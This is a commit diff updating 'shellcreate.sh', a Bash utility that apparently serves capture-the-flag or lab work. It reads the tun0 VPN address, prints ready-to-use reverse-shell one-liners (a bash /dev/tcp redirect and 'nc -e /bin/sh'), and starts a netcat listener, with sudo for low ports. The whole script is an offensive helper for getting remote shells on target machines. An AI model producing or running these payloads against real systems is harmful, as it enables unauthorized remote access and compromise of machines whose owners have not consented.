cc53b8fdc16079c57487b6a0dc10d13132620db7
0xAtti <68794830+0xatti@users.noreply.github.com>
2020-07-26 00:28:02 -0400

    Update shellcreate.sh

--- shellcreate.sh
+++ shellcreate.sh
@@ -1,26 +1,49 @@
-#Lazy Shell Script
 #!/bin/bash
 host=$(/sbin/ifconfig tun0 | grep "10.10." | awk '{print $2}')
-printf "0xAtti lazy shell\n"
-printf "=================\n"
-printf "\nPick an option\n"
-echo "(1) Bash Reverse Shell with NetCat"
-echo "(2) Standard Shell text output\n"
+
+printf "
+╔══════════════╗
+   Lazy Shell
+╚══════════════╝\n"
+printf "Author: 0xAtti\n"
+
+
+printf "\nOptions\n"
+echo "( 1 ) Bash reverse shell with netcat"
+echo "( 2 ) Standard shell text output\n"
+printf "Select option: "
 read input
 
-if [ $input = 1 ]; then
-echo What port would you like to use?
-read port
-printf "==================================================================\n\n"
-echo   "Bash Shell:   bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
-nc -lvp $port
+if [ $input -ge "3" ]; then
+printf "Please enter a valid option\n"
+sh ~/.config/scripts/shell.sh
 fi
 
 if [ $input = 2 ]; then
-echo What port would you like to use?
-read port
-printf "==================================================================\n\n"
-echo   "Bash Shell:   bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
-echo   "\nNetCat Shell: nc -e /bin/sh $host $port\n"
-printf "\n==================================================================\n"
+printf 'Enter desired port: '
+read -r port
+printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
+printf       "Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
+printf     "\nNetCat Shell: nc -e /bin/sh $host $port\n"
+printf "\n╚══════════════════════════════════════════════════════════════════╝\n"
+exit
+fi
+
+if [ $input = 1 ]; then
+printf "Enter desired port: "
+
+fi
+read -r port
+if [ $port -lt "1000" ]; then
+printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
+printf   "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n\n"
+printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
+sudo nc -lvp $port
+fi
+
+if [ $port -gt "1000" ]; then
+printf "\n╔══════════════════════════════════════════════════════════════════╗\n\n"
+printf   "  Bash Shell:  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n\n"
+printf "╚══════════════════════════════════════════════════════════════════╝\n\n"
+nc -lvp $port
 fi
